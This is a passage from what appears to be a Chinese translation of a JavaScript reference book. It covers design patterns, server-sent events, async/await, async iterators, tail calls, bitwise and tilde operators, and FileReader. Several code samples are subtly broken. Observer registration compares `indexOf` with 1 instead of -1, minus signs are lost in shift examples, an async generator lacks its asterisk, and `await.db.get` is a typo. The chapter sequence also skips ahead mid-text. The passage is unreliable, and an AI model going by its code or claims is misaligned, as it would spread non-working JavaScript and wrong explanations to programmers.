  \ `addEventListener`，那么你就利用观察者模式。\n\n```javascript\nfunction Subject() {\n  this.observers\
  \ = []; // 监听主体的观察者\n  this.registerObserver = function(observer) {\n    // 如果观察者尚未被跟踪，则添加\n\
  \    if (this.observers.indexOf(observer) === 1) {\n      this.observers.push(observer);\n\
  \    }\n  };\n  this.unregisterObserver = function(observer) {\n    // 移除之前注册的观察者\n\
  \    var index = this.observers.indexOf(observer);\n    if (index > 1) {\n     \
  \ this.observers.splice(index, 1);\n    }\n  };\n  this.notifyObservers = function(message)\
  \ {\n    // 向所有观察者发送消息\n    this.observers.forEach(function(observer) {\n      observer.notify(message);\n\
  \    });\n  };\n}\n\nfunction Observer() {\n  this.notify = function(message) {\n\
  \    // 每个观察者必须实现此函数\n  };\n}\n\n// 使用示例：\n```javascript\nfunction Employee(name)\
  \ {\n  this.name = name;\n  // 实现 notify 以便主体可以传递消息\n  this.notify = function(meetingTime)\
  \ {\n    console.log(this.name + ': There is a meeting at ' + meetingTime);\n  };\n\
  }\n\nvar bob = new Employee('Bob');\nvar jane = new Employee('Jane');\nvar meetingAlerts\
  \ = new Subject();\nmeetingAlerts.registerObserver(bob);\nmeetingAlerts.registerObserver(jane);\n\
  meetingAlerts.notifyObservers('4pm');\n\n// 输出： // Bob: There is a meeting at 4pm\
  \ // Jane: There is a meeting at 4pm\n```\n\n### 第 79.2 节：中介模式模式\n\n将中者模式想象成控制空中飞机的塔台：它指挥这架飞机现在落地，第二架等待，第三架起飞等。然而，没有任何飞机被允许与其同级进行通信。\n\
  \n这就是中介模式的工作原理，它作为不同模块之间的通信枢纽，通过这种方式减少了模块间的依赖，增加了松耦合，并提高了可移植性。\n\n这个 **聊天室示例** 解释了中介模式的工作原理：\n\
  \n```javascript\n// 每个参与者只是一个想要与其他模块（其他参与者）通信的模块\nvar Participant = function(name)\
  \ {\n  this.name = name;\n  this.chatroom = null;\n};\n```\n\n\n\n\n\n```javascript\n\
  // 每个参与者都有说话的方法，也有听其他参与者说话\nParticipant.prototype = {\n  send: function(message,\
  \ to) {\n    this.chatroom.send(message, this, to);\n  },\n  receive: function(message,\
  \ from) {\n    log.add(from.name + \" to \" + this.name + \": \" + message);\n \
  \ }\n};\n\n// 聊天室是中介者：它是参与者发送消息和接收消息的中枢\nvar Chatroom = function() {\n  var participants\
  \ = {};\n  return {\n    register : function(participant) {\n      participants[participant.name]\
  \ = participant; participant.chatroom = this;\n    },\n    send: function(message,\
  \ from) {\n      for (key in participants) {\n        if (participants[key] !==\
  \ from) { //你不能给自己发消息！\n          participants[key].receive(message, from);\n  \
  \      }\n      }\n    }\n  };\n};\n\n// 日志辅助工具\nvar log = (function() { var log\
  \ = \"\";\n  return {\n    add: function(msg) { log += msg + \"\\n\"; }, show: function()\
  \ { alert(log); log = \"\"; }\n  }\n})();\n\nfunction run() {\n  var yoko = new\
  \ Participant(\"Yoko\"); var john = new Participant(\"John\"); var paul = new Participant(\"\
  Paul\"); var ringo = new Participant(\"Ringo\");\n  var chatroom = new Chatroom();\
  \ chatroom.register(yoko); chatroom.register(john); chatroom.register(paul); chatroom.register(ringo);\n\
  \  yoko. send(\"All you need is love.\"); yoko.send(\"I love you John.\"); paul.send(\"\
  Ha, I heard that!\");\n  log.show();\n}\n```\n\n### 第 79.3 节：命令 (Command)\n\n命令模式封装了方法的参数、当前对象状态以及要调用的方法。它对于封装以后调用方法所需的所有内容非常有用。它可以发布一个“命令”，并在以后决定使用哪段代码来执行该命令。\n\
  \n该模式包含三个组件：\n\n1. `命令消息 (Command Message)` - 命令本身，包括方法名、参数和状态。\n2. `调用者 (Invoker)`\
  \ - 指令命令执行其指令的部分。它可以是一个定时事件、用户交互、进程中的某一步、回调，或任何执行命令所需的运行。\n3. `接收者 (Receiver)` -\
  \ 命令执行的目标。\n\n#### 作为数组的命令消息\n\n`var aCommand = new Array();`\n\n`aCommand.push(new\
  \ Instructions().DoThis); //要执行的方法`\n`aCommand.push(\"String Argument\"); //字符串参数`\n\
  `aCommand.push(777);`\n`aCommand.push(new Object {} ); aCommand.push(new Array()\
  \ ); //整数参数 //对象参数 //数组参数`\n\n#### 命令类的构造函数\n\n```javascript\nclass DoThis { constructor(\
  \ stringArg, numArg, objectArg, arrayArg ) {\n  this._stringArg = stringArg;\n \
  \ this._numArg = numArg;\n  this._objectArg = objectArg;\n  this._arrayArg = arrayArg;\n\
  \  }\n\n  Execute () {\n    var receiver = new Instructions();\n    receiver.DoThis(this._stringArg,\
  \ this._numArg, this._objectArg, this._arrayArg );\n  }\n}\n```\n\n#### 调用者\n\n\
  `aCommand.Execute();`\n\n可以调用：\n- 立即执行\n- 响应事件\n- 在执行序列中\n- 作为回调响应或在事件循环结束时的 promise\
  \ 中\n- 以任何其他需要调用方法的方式\n\n#### 接收者\n\n```javascript\nclass Instructions {\n  DoThis\
  \ ( stringArg, numArg, objectArg, arrayArg ) {\n    console.log( `${stringArg},\
  \ ${numArg}, ${objectArg}, ${arrayArg}` );\n  }\n}\n```\n\n客户端生成一个命令，将其传递给调用者，调用者要么立即执行它，要么延迟命令，然后命令对接收者起作用。当命令模式与伴侣模式结合使用创建消息模式时非常有用。\n\
  \n### 第 79.4 节：迭代器 (Iterator)\n\n迭代器模式提供了一种简单的方法来顺序选择集合中的下一个项目。\n\n#### 固定集合\n\n\
  ```javascript\nclass BeverageForPizza {\n  constructor(preferenceRank) {\n    this.beverageList\
  \ = beverageList;\n    this.pointer = 0;\n  }\n  next() {\n    return this.beverageList[this.pointer++];\n\
  \  }\n}\n```\n\n`var withPepperoni = new BeverageForPizza([\"Cola\", \"Water\",\
  \ \"Beer\"]); withPepperoni.next(); //Cola`\n`withPepperoni.next(); //Water`\n`withPepperoni.next();\
  \ //Beer`\n\n在 ECMAScript 2015 中，迭代器是内置的方法，返回 `done` 和 `value`。当迭代器到达集合末尾时，`done`\
  \ 为 `true`。\n\n```javascript\nfunction preferredBeverage(beverage){\n  if ( beverage\
  \ == \"Beer\" ){\n    return true;\n  } else {\n    return false;\n  }\n}\n```\n\
  \n`var withPepperoni = new BeverageForPizza([\"Cola\", \"Water\", \"Beer\", \"Orange\
  \ Juice\"]); for ( var bevToOrder of withPepperoni ){\n  if ( preferredBeverage(\
  \ bevToOrder ) {\n    bevToOrder.done; //false,因为 \"Beer\" 不是集合的最后一个项目\n    return\
  \ bevToOrder; //\"Beer\"\n  }\n}\n```\n\n#### 作为生成器 (Generator)\n\n```javascript\n\
  class FibonacciIterator {\n  constructor() {\n    this.previous = 1;\n    this.beforePrevious\
  \ = 1;\n  }\n  next() {\n    var current = this.previous + this.beforePrevious;\n\
  \    this.beforePrevious = this.previous;\n    this.previous = current;\n    return\
  \ current;\n  }\n}\n```\n\n`var fib = new FibonacciIterator(); fib.next(); //2`\n\
  `fib.next(); //3`\n`fib.next(); //5`\n\n在 ECMAScript 2015 中\n\n```javascript\nfunction*\
  \ FibonacciGenerator() { //星号告知 javascript 这是一个生成器\n  var previous = 1;\n  var beforePrevious\
  \ = 1;\n  while(true) {\n    var current = previous + beforePrevious;\n    beforePrevious\
  \ = previous;\n    previous = current;\n    yield current; //这类似于 return 但\n   \
  \ // 它保留了函数的当前状态 // 即它记住了调用之间的位置*\n  }\n}\n```\n\n`var fib = FibonacciGenerator();\
  \ fib.next().value; //2`\n`fib.next().value; //3`\n`fib.next().value; //5`\n`fib.next().done;\
  \ //false`\n\n### 第 80 章：服务器发送事件 (Server-sent events)\n\n#### 第 80.1 节：向服务器设置基础事件流\n\
  \n你可以使用 `EventSource` 对象设置客户端浏览器来监听传入的服务器事件。你需要向构造函数提供一个指向服务器 API 端点的路径字符串，该端点将客户端订阅到服务器事件。\n\
  \n示例：\n`var eventSource = new EventSource(\"api/my-events\");`\n\n事件有名称，用于分类和发送，并且必须设置一个监听器来按名称监听每个此类事件。默认事件名称为\
  \ `message`，为了监听它，你必须使用适当的事件监听器 `.onmessage`。\n\n```javascript\nevtSource. onmessage\
  \ = function(event) {\n  var data = JSON.parse(event.data);\n  // 对数据进行某些操作\n}\n\
  ```\n\n每当服务器向客户端推送事件，上述函数就会运行。数据以 `text/plain` 格式发送，如果你发送 JSON 数据可能对其进行解析。\n\n####\
  \ 第 80.2 节：关闭事件流\n\n可以使用 `EventSource.close()` 方法关闭到服务器的事件流。\n\n`var eventSource\
  \ = new EventSource(\"api/my-events\");`\n`// 执行某些操作 ...`\n`eventSource.close();\
  \ //你将不再从该对象接收更多事件`\n\n如果流已经关闭，`.close()` 方法将不起任何作用。\n\n#### 第 80.3 节：将事件监听器绑定到\
  \ EventSource\n\n你可以使用 `.addEventListener` 方法将事件监听器绑定到 `EventSource` 对象，以监听不同的事件通道。\n\
  \n`EventSource.addEventListener(name: String, callback: Function, [options])`\n\n\
  - `name`: 与服务器发送事件通道名称相关的名称。\n- `callback`: 每当绑定到通道的事件触发时，回调函数就会运行，该函数将事件作为参数提供。\n\
  - `options`: 定义事件监听器行为的选项。\n\n以下示例显示了来自服务器的心跳事件流，服务器在心跳通道上发送事件，此例程在接受事件时将始终运行。\n\
  \n```javascript\nvar eventSource = new EventSource(\"api/heartbeat\"); ...\neventSource\
  \ .addEventListener(\"heartbeat\", function(event) {\n  var status = event.data;\n\
  \  if (status=='OK') {\n    // 执行某些操作\n  }\n});\n```\n\n### 第 81 章：异步函数 (async/await)\n\
  \n\n\n\n\n`async` 和 `await` 基于承诺（promises）和生成器（generators），以内联的方式表示异步操作。这使得异步代码或回调代码变得更易维护。\n\
  \n带有 `async` 关键字的函数返回一个 `Promise`，并可以使用该语法进行调用。\n\n在 `async` 函数内部，`await` 关键字可以应用于任何\
  \ `Promise`，它会使 `await` 的所有函数体在 promise 解决（resolve）后执行。\n\n## 第 81.1 节：引言\n\n定义为\
  \ `async` 的函数是可以执行异步操作但看起来仍然同步的函数。其实现方式是使用 `await` 关键字来推迟函数，直到等待 `Promise` 解决或拒绝（reject）。\n\
  \n**注意：** 异步函数是一个 Stage 4（已完成）的提案，将被纳入 ECMAScript 2017 标准中。\n\n例如，使用基于 promise 的\
  \ `Fetch API`：\n\n```javascript\nasync function getJSON(url) {\n  try {\n    const\
  \ response = await fetch(url);\n    return await response.json();\n  } catch (err)\
  \ {\n    // promise 中的拒绝将在这里抛出\n    console.error(err.message);\n  }\n}\n```\n\n\
  异步函数总是总是返回一个 `Promise` 本身，因此你可以在其他异步函数中使用它。\n\n**箭头函数样式**\n\n```javascript\nconst\
  \ getJSON = async url => {\n  const response = await fetch(url); return await response.json();\n\
  }\n```\n\n## 第 81.2 节：Await 和运算符优先级\n\n在使用 `await` 关键字时，必须记住运算符的优先级。\n\n假设我们有一个异步函数，它调用了另一个异步函数\
  \ `getUnicorn()`，该函数返回一个解决为 `Unicorn` 类实例的 `Promise`。现在我们想使用该类的 `getSize()` 方法来获取独角兽的大小。\n\
  \n看下面的代码：\n\n```javascript\nasync function myAsyncFunction() {\n  await getUnicorn().getSize();\n\
  }\n```\n\n乍一看，这似乎是有效的，但实际上不是。由于运算符优先级，它等同于以下代码：\n\n```javascript\nasync function\
  \ myAsyncFunction() { await (getUnicorn().getSize()); }\n```\n\n在这里，我们尝试调用 `Promise`\
  \ 对象的 `getSize()` 方法，这并不是我们想要的。\n\n相反，我们应该使用括号来表示我们先想等待独角兽，然后调用结果的 `getSize()` 方法：\n\
  \n```javascript\nasync function asyncFunction() { (await getUnicorn()).getSize();\n\
  }\n```\n\n当然，之前的版本在某些情况下可能是有效的，例如，如果 `getUnicorn()` 函数是同步的，但 `getSize()` 方法是异步的。\n\
  \n## 第 81.3 节：异步函数与 Promise 的比较\n\n异步函数并没有替换 `Promise` 类型；它们增加了语言关键字，使得承诺的调用更加简单。它们是互换的：\n\
  \n```javascript\nasync function doAsyncThing() { ... }\n\nfunction doPromiseThing(input)\
  \ { return new Promise((r, x) => ...); }\n\n// 使用 promise 语法调用\ndoAsyncThing()\n\
  \  .then(a => doPromiseThing(a))\n  .then(b => ...)\n  .catch(ex => ...);\n\n//\
  \ 使用 await 语法调用\ntry {\n  const a = await doAsyncThing();\n  const b = await doPromiseThing(a);\n\
  \  ...\n} catch(ex) { ... }\n```\n\n任何使用 promise 链的函数都可以使用 `await` 重写：\n\n```javascript\n\
  function newUnicorn() {\n  return fetch('unicorn.json') // 从服务器获取 unicorn.json\n\
  \    .then(responseCurrent => responseCurrent.json()) // 将响应解析为 JSON\n    .then(unicorn\
  \ =>\n      fetch('new/unicorn', {\n        method: 'post',\n        body: JSON.stringify({unicorn})\n\
  \      })\n    )\n    .then(responseNew => responseNew.json())\n    .then(json =>\
  \ json.success)\n    // 向 'new/unicorn' 发送请求 // 使用 POST 方法\n    // 将独角兽传递到请求体中 \n\
  \    // 返回响应的 success 属性\n    .catch(err => console.log('Error creating unicorn:',\
  \ err));\n}\n```\n\n该函数可以使用 `async` / `await` 重写如下：\n\n```javascript\nasync function\
  \ newUnicorn() {\n  try {\n    const responseCurrent = await fetch('unicorn.json');\
  \ // 从服务器获取 unicorn.json\n    const unicorn = await responseCurrent.json();\n  \
  \  const responseNew = await fetch('new/unicorn', {\n      method : 'post',\n  \
  \    body: JSON.stringify({unicorn})\n    });\n    const json = await responseNew.json();\n\
  \    return json.success\n  } catch (err) {\n    console.log('Error creating unicorn:',\
  \ err);\n  }\n  // 将响应解析为 JSON\n  // 向 'new/unicorn' 发送请求 // 使用 POST 方法\n  // 将独角兽传递到请求体中\
  \ \n  // 返回响应的 success 属性\n}\n```\n\n这个 `newUnicorn()` 的异步变体似乎返回一个 `Promise`，但实际上有多个\
  \ `await` 关键字。每个都返回一个 `Promise`，所以实际上我们拥有的是一组承诺而不是一个链。\n\n事实上，我们可以将其看作一个函数生成器，每个\
  \ `await` 都是 `yield` 一个新的 `Promise`。然而，下一个操作需要每个 promise 的结果来继续执行函数。这就是为什么在函数上需要额外的\
  \ `async` 关键字（在调用 promise 时也需要 `await` 关键字），因为它告诉 JavaScript 自动为该迭代创建一个观察者。`async\
  \ function function newUnicorn()` 返回的 `Promise` 在此迭代完成时解决。\n\n在实践中，你不需要考虑这些；`await`\
  \ 隐藏了 promise，而 `async` 隐藏了生成器的迭代。\n\n你可以像调用 promise 一样调用异步函数，并 `await` 任何函数。如果你想立即执行该代码，可以使用\
  \ IIFE（立即调用函数表达式）：\n\n```javascript\n(async () => {\n  await makeCoffee()\n  console.log('coffee\
  \ is ready!')\n})()\n```\n\n## 第 81.4 节：使用 async 进行循环\n\n在循环中使用 async await 时，你可能会遇到这些问题。\n\
  \n如果你只是尝试在 `forEach` 内部使用 `await`，这将抛出错误。\n\n```javascript\n(async() => {\n  data\
  \ = [1, 2, 3, 4, 5];\n  data.forEach(e => {\n    const i = await somePromiseFn(e);\n\
  \    console.log(i);\n  });\n})();\n```\n\n这是因为你将箭头函数视为一个块。解释器保护我们不犯上述错误，但如果你在 `forEach`\
  \ 回调中添加 `async`，就不会有错误。\n\n```javascript\n(async() => {\n  data = [1, 2, 3, 4, 5];\n\
  \  data.forEach(async(e) => {\n    const i = await somePromiseFn(e);\n    console.log(i);\n\
  \  });\n  console.log('this will print first');\n})();\n```\n\n发生这种情况是因为回调异步函数只能暂停它自己，而不能暂停父异步函数。\n\
  \n你可以编写一个返回 promise 的 `asyncForEach` 函数，然后你可以执行诸如 `await asyncForEach(async (e)\
  \ => await somePromiseFn(e), data )` 的操作。基本上，你返回一个在所有回调都被等待并完成后才解决的 promise。但有更好的实现方法，就是直接使用循环。\n\
  \n你可以使用 `for-of` 循环或 `for`/`while` 循环，选择哪一个并不重要。\n\n```javascript\n(async() => {\n\
  \  data = [1, 2, 3, 4, 5];\n  for (let e of data) {\n    const i = await somePromiseFn(e);\n\
  \    console.log(i);\n  }\n  console.log('this will print last');\n})();\n```\n\n\
  但还有一个陷阱。这个解决方案会等待每次 `somePromiseFn` 调用完成后再迭代到下一个。\n\n如果你实际上希望 `somePromiseFn` 调用按顺序执行，这是非常完美的；但如果你希望它们并发运行，你需要\
  \ `await` `Promise.all`。\n\n```javascript\n(async() => {\n  data = [1, 2, 3, 4,\
  \ 5];\n  const p = await Promise.all(data.map(async(e) => await somePromiseFn(e)));\
  \ console.log(...p);\n})();\n```\n\n`Promise.all` 接收一个 promise 数组作为唯一参数并返回一个 promise。当数组中的所有\
  \ promise 都时，返回的 promise 也会解决。我们 await 该 promise，当它解决时，我们所有的值都可用了。\n\n\n\n\n上述示例均可运行。`somePromiseFn`\
  \ 函数可以被实现为一个带有超时的异步回声函数。你可以在 `babel-repl` 中尝试这些示例，至少使用 `stage-3` 预设并查看输出。\n\n```javascript\n\
  function somePromiseFn(n) {\nreturn new Promise((res, rej) => { setTimeout(() =>\
  \ res(n), 250);\n\n});\n}\n```\n\n## 第 81.5 ：更少的缩进\n\n使用 promises：\n\n```javascript\n\
  function doTheThing() {\n  return doOneThing()\n  .then(doAnother) .then(doSomeMore)\
  \ .catch(handleErrors)\n}\n```\n\n使用 async 函数：\n\n```javascript\nasync function\
  \ doTheThing() {\n  try {\n    const one = await doOneThing(); const another = await\
  \ doAnother(one); return await doSomeMore(another);\n  } catch (err) {\n    handleErrors(err);\n\
  \  }\n}\n```\n\n注意 return 位于底部而不是顶部，并且你使用了语言原生的错误处理机制（`try`/`catch`）。\n\n## 第 81.6\
  \ 节：同步异步（并行）操作\n\n你通常希望并行执行异步操作。async/await 提案中有直接支持此点的的语法，但由于 `await` 会等待 promise，你可以将多个\
  \ promise 封装在 `Promise.all` 中来等待它们：\n\n```javascript\n// 非并行\nasync function getFriendPosts(user)\
  \ {\n  friendIds = await db.get(\"friends\", {user}, {id: 1});\n  friendPosts =\
  \ [];\n  for (let id in friendIds) {\n    friendPosts = friendPosts.concat( await\
  \ db.get(\"posts\", {user: id}) ); }\n  }\n// 等等\n}\n```\n\n这将串行执行每个查询来获取每个朋友的帖子，但它们可以同时进行：\n\
  \n```javascript\n// 并行\nasync function getFriendPosts(user) {\n  friendIds = await.db.get(\"\
  friends\", {user}, {id: 1}); friendPosts = await Promise.all( friendIds.map(id =>\n\
  \  db. get(\"posts\", {user: id})\n);\n// 等等\n}\n```\n\n这将将遍历 ID 列表以创建一个 promise\
  \ 数组。`await` 会等待*所有* promise 完成。`Promise.all` 将它们合并为单个 promise，但它们是并行执行的。\n\n##\
  \ 第 82 章：异步迭代器\n\n异步函数是一个返回 promise 的函数。`await` 会将控制权交给调用者，直到 promise 解析完成然后使用结果继续执行。\n\
  \n迭代器允许使用 `for-of` 循环遍历集合。\n\n异步迭代器是一个集合，其中每次迭代都是一个 promise，可以使用 `for-await-of`\
  \ 循环进行等待。异步迭代器是一个阶段 3 提案。它们出现在 Chrome Canary 60 中，并带有 `-harmony-async-iteration`。\n\
  \n## 第 82.1 节：基础\n\nJavaScript `Iterator` 是一个拥有 `.next()` 方法的对象，该方法返回一个 `IteratorItem`，该项是一个包含\
  \ `value : <any>` 和 `done : <boolean>` 的对象。\n\nJavaScript `AsyncIterator` 是一个拥有\
  \ `.next()` 方法的对象，该方法返回一个 `Promise<IteratorItem>`，即下一个值的*promise*。\n\n要创建一个 `AsyncIterator`，我们可以使用*异步生成器*（async\
  \ generator）语法：\n\n```javascript\n/**\n* 返回一个在时间通过后解析的 promise。\n*/\nconst delay\
  \ = time => new Promise(resolve => setTimeout(resolve, time));\nasync function delayedRange(max)\
  \ {\n  for (let i = 0; i < max; i++) {\n    await delay(1000);\n    yield i;\n \
  \ }\n}\n```\n\n`delayedRange` 函数接收一个最大值，并返回一个 `AsyncIterator`，它每隔 1 秒产生一个从 0 到该数字的数字。\n\
  \n用法：\n\n```javascript\nfor await (let number of delayedRange(10)) { console.log(number);\n\
  }\n```\n\n`for-await of` 循环是另一个新语法，仅在异步函数和异步生成器内部可用。在循环内部，产出的值（记住，它们是 Promise）会被解包，因此\
  \ Promise 被隐藏起来了。在循环内部，你可以处理直接值（产出的数字），`for-await of` 循环会代表你等待这些 Promise。\n\n上面的示例将等待\
  \ 1 秒，打印 0，再等待 1 秒，打印 1，依此类推，直到打印 9。此时，`AsyncIterator` 将完成，`for-await of` 循环将退出。\n\
  \n## 第 83 章：如何在异步回调函数内部使迭代器可用\n\n使用异步回调时，我们需要考虑作用域。*尤其*在循环内部时。这篇简短的文章展示了不该怎么做，以及一个简单的工作示例。\n\
  \n### 第 83.1 节：错误代码，你能看出为什么这种 key 的用法会导致 bug 吗？\n\n```javascript\nvar pipeline =\
  \ {};\n\n// (...) 在 pipeline 中添加内容\nfor(var key in pipeline) {\n  fs.stat(pipeline[key].path,\
  \ function(err, stats) {\n    if (err) {\n      // 清除那一个\n      delete pipeline[key];\n\
  \      return;\n    }\n    // (...)*\n    pipeline[key].count++;\n  });\n}\n```\n\
  \n问题在于 `var key` 只有一个实例。所有的回调将共享同一个 key 实例。在回调触发时，key 很可能已经增加，并且不再指向我们正在获取统计信息的那个元素。\n\
  \n### 第 83.2 节：正确写法\n\n```javascript\nvar pipeline = {};\n\n// (...) 在 pipeline\
  \ 中添加内容\nvar processOneFile = function(key) {\n  fs.stat(pipeline[key].path, function(err,\
  \ stats) { \n    if (err) {\n      // 清除那一个\n      delete pipeline[key];\n     \
  \ return;\n    }\n    // (...)*\n    pipeline[key].count++;\n  });\n};\n\n// 验证它没有在增长\
  \ for(var key in pipeline) { processOneFileInPipeline(key); }\n```\n\n通过创建一个新函数，我们将\
  \ `key` 范围化在函数内部，使得所有回调都有它们自己的 key 实例。\n\n## 第 84 章：尾调用优化\n\n### 第 84.1 节：什么是尾调用优化\
  \ (TCO)\n\nTCO 仅在严格模式下可用。\n\n一如总是检查浏览器和 JavaScript 实现对任何语言特性的支持，与其他 JavaScript 特性或语法一样，它在未来可能会发生变化。\n\
  \n它提供了一种优化递归和深度嵌套调的方法。\n\n```javascript\nfunction a(){\n  return b(); // 2\n}\n\
  function b(){\n  return 1; // 3\n}\na(); // 1\n```\n\n如果没有 TCO，对 `a()` 的调用会该函数创建一个新的帧。当该函数调用\
  \ `b()` 时，`a()` 的帧被推入帧栈，并为 `b()` 创建一个新帧。\n\n当 `b()` 返回到 `a()` 时，`a()` 的帧从帧栈中弹出。它立即返回。\n\
  \nTCO 识别出从 `a()` 到 `b()` 的调用位于函数 `a()` 的尾部，因此不需要将 `a()` 的状态推入帧栈。它允许递归函数无限递归，因为帧栈不会随着每次调用而增长。\n\
  \n**注意 TCO 是 JavaScript 引擎实现特性，如果浏览器不支持，则无法通过编译器实现。实现 TCO 不需要额外的规范语法，因此担心 TCO 可能会破坏网页。它向世界的发布非常谨慎，可能需要设置浏览器/引擎特定的标志。**\n\
  \n### 第 84.2 节：递归循环\n\n尾调用优化使得安全地实现递归循环而不必担心调用栈溢出或帧栈增长的开销。\n\n```javascript\nfunction\
  \ indexOf(array, predicate, i = 0) {\n  if (0 <= i && i < array.length) {\n    if\
  \ (predicate(array[i])) { return i; }\n    return indexOf(array, predicate, i +\
  \ 1); // 尾调用\n  }\n}\nindexOf([1,2,3,4,5,6,7], x => x === 5); // 返回 5 的索引，即 4\n\
  ```\n\n## 第 85 章：位运算符 - 真实世界示例（代码片段）\n\n### 第 85.1 节：使用位异或交换两个整数（无需额外的内存分配）\n\n\
  ```javascript\nvar a = 11, b = 22;\na = a ^ b;\nb = a ^ b;\na = a ^ b;\n```\n\n\n\
  \n\n\n```javascript\nconsole.log(\"a = \" + a + \"; b = \" + b); // a is now 22\
  \ and b is now 11\n```\n\n### 第 85.2 节：2 的幂的快速乘法或除法\n\n位左移（右移）等同于乘以（除以）`2`。在十进制中也是如此：如果我们将\
  \ `13` 向“左移” `2` 位，我们得到 `1300`，或者说 `13 * (10 ** 2)`。如果我们取 `12345` 向“右移” `3` 位并去掉小数部分，我们得到\
  \ `12`，或者 `Math.floor(12345 / (10 ** 3))`。因此，如果我们想将一个变量乘以 `2 ** n`，只需向左移 `n` 位即可。\n\
  \n```javascript\nconsole.log(13 * (2 ** 6)) // 13 * 64 = 832\nconsole.log(13 <<\
  \ 6) // 832\n```\n\n同样，要对 `2 ** n` 进行（取整）整数除法，我们可以向右移 `n` 位。示例：\n\n```javascript\n\
  console.log(1000 / (2 ** 4)) // 1000 / 16 = 62.5\nconsole.log(1000 >> 4) // 62\n\
  ```\n\n它对负数也有效：\n\n```javascript\nconsole.log(80 / (2 ** 3)) // -80 / 8 = -10\n\
  console.log(80 >> 3) // -10\n```\n\n在现实中，算术速度不太可能显著影响代码的运行时间，除非你正在进行数亿次的计算。但 C 语言程序员非常喜欢这种操作！\n\
  \n### 第 85.3 节：使用位与运算检测数字奇偶性\n\n与其使用这个（不幸的是在实际代码中经常见到）“杰作”：\n\n```javascript\nfunction\
  \ isEven(n) {\n  return n % 2 == 0;\n}\n\nfunction isOdd(n) {\n  if (isEven(n))\
  \ {\n    return false;\n  } else {\n    return true;\n  }\n}\n```\n\n你可以用更高效、简单的方法进行奇偶校验：\n\
  \n```javascript\nif (n & 1) {\n  console.log(\"ODD!\");\n} else {\n  console.log(\"\
  EVEN!\");\n}\n```\n（这不仅对 JavaScript 有效）\n\n### 第 86 章：波浪号 ~\n\n`~` 运算符查看表达式值的二进制表示形式，并对其进行位取反操作。\n\
  \n表达式中任何为 `1` 的数字都会变成结果中的 `0`。表达式中任何为 `0` 的数字都会变成结果中的 `1`。\n\n### 第 86.1 节：~ 整数\n\
  \n以下示例说明了在整数上使用位取反（`~`）运算符。\n\n```javascript\nlet number = 3;\nlet complement =\
  \ ~number;\n```\n\n变量 `complement` 的结果等于 `-4`；\n\n| 表达式 | 二进制值 | 十进制值 |\n| :---\
  \ | :--- | :--- |\n| 3 | 00000000 00000000 00000000 00000011 | 3 |\n| ~3 | 11111111\
  \ 11111111 11111111 11111100 | -4 |\n\n为了简化这一点，我们可以将其理解为函数 `f(n) = -(n+1)`。\n\n\
  ```javascript\nlet a = ~-2; // a is now 1\nlet b = ~-1; // b is now 0\nlet c = ~0;\
  \ // c is now -1\nlet d = ~1; // d is now -2\nlet e = ~2; // e is now -3\n```\n\n\
  ### 第 86.2 节：~~ 运算符\n\n双波浪号 `~~` 将执行两次位取反操作。\n\n以下示例说明了在小数上使用位取反（`~~`）运算符。\n\n为了保持简单，使用了小数\
  \ `3.5`，因为它在二进制格式下的表示简单。\n\n```javascript\nlet number = 3.5;\nlet complement = ~number;\n\
  ```\n\n变量 `complement` 的结果等于 `-4`；\n\n| 表达式 | 二进制值 | 十进制值 |\n| :--- | :--- | :---\
  \ |\n| 3 | 00000000 00000000 00000000 00000011 | 3 |\n| ~~3 | 00000000 00000000\
  \ 00000000 00000011 | 3 |\n| 3.5 | 00000000 00000011.1 | 3.5 |\n| ~~3.5 | 00000000\
  \ 00000011 | 3 |\n\n为了简化这一点，我们可以将其理解为函数 `f2(n) = -(-(n+1) + 1)` 和 `g2(n) = -(-(integer(n)+1)\
  \ + 1)`。\n\n`f2(n)` 将保持整数不变。\n\n```javascript\nlet a = ~~-2; // a is now -2\nlet\
  \ b = ~~-1; // b is now -1\nlet c = ~~0; // c is now 0\nlet d = ~~1; // d is now\
  \ 1\nlet e = ~~2; // e is now 2\n```\n\n`g2(n)` 本质上是将正数向下取整，负数向上取整。\n\n```javascript\n\
  let a = ~~-2.5; // a is now -2\nlet b = ~~-1.5; // b is now -1\nlet c = ~~0.5; //\
  \ c is now 0\nlet d = ~~1.5; // d is now 1\nlet e = ~~2.5; // e is now 2\n```\n\n\
  ### 第 86.3 节：将非数值转换为数字\n\n`~~` 用于非数值。数值表达式首先转换为数字，然后对其进行位取反操作。\n\n如果表达式无法转换为数值，它将转换为\
  \ `0`。\n\n`true` 和 `false` 布尔值是例外，其中 `true` 呈现为数值 `1`，`false` 呈现为 `0`。\n\n```javascript\n\
  ~~true // 1\n~~false // 0\n```\n\n\n\n\n\n将文件作为文本文件读取。无法读取二进制文件。请使用 `readAsArrayBuffer`。\n\
  \n### 第 89.1 节：作为字符串读取文件\n\n确保你的页面上有一个文件输入框：\n\n`<input type=\"file\" id=\"upload\"\
  >`\n\n然后在 JavaScript 中编写：\n\n```javascript\ndocument.getElementById('upload').addEventListener('change',\
  \ readFileAsString)\nfunction readFileAsString() {\n  var files = this.files;\n\
  \  if (files.length === 0) {\n    console.log('No file is selected');\n    return;\n\
  \  }\n  var reader = new FileReader();\n  reader.onload = function(event) {\n  \
  \  console.log('File content:', event.target.result);\n  };\n  reader.readAsText(files[0]);\n\
  }\n```\n\n### 第 89.2 节：将文件读取 dataURL\n\n在 Web 应用程序中读取文件内容可以使用 HTML5 File API。首先，在你的\
  \ HTML 中添加一个 `type=\"file\"` 的输入框：\n\n`<input type=\"file\" id=\"upload\">`\n\n\
  接下来，我们将为文件输入添加一个更改监听器。此示例通过 JavaScript 定义监听器，但它也可以作为属性添加到输入元素上。该监听器会在每次选择新文件时被触发。在这个回调函数中，我们可以读取所选的文件并执行后续操作（例如使用所选文件的内容创建图像）：\n\
  \n```javascript\ndocument.getElementById('upload').addEventListener('change', showImage);\n\
  function showImage(evt) {\n  var files = evt.target.files;\n  if (files.length ===\
  \ 0) {\n    console.log('No files selected');\n    return;\n  }\n  var reader =\
  \ new FileReader();\n  reader.onload = function(event) {\n    var img = new Image();\n\
  \    img.onload = function() {\n      document.body.appendChild(img);\n    };\n\
  \    img.src = event.target.result;\n  };\n  reader.readAsDataURL(files[0]);\n}\n\
  ```\n\n### 第 89.3 节：切片文件\n\n`blob.slice()` 方法用于创建一个新的 `Blob` 对象，其中包含源 `Blob` 中指定字节范围的数据。该方法也适用于\
  \ `File` 实例，因为 `File` 扩展了 `Blob`。\n\n在这里我们按特定数量的块来切分文件。这在需要处理大到无法一次性读入内存的文件时特别有用。然后可以使用\
  \ `FileReader` 逐个读取这些块。\n\n```javascript\n/**\n * @param {File|Blob} - 要切片的文件\n\
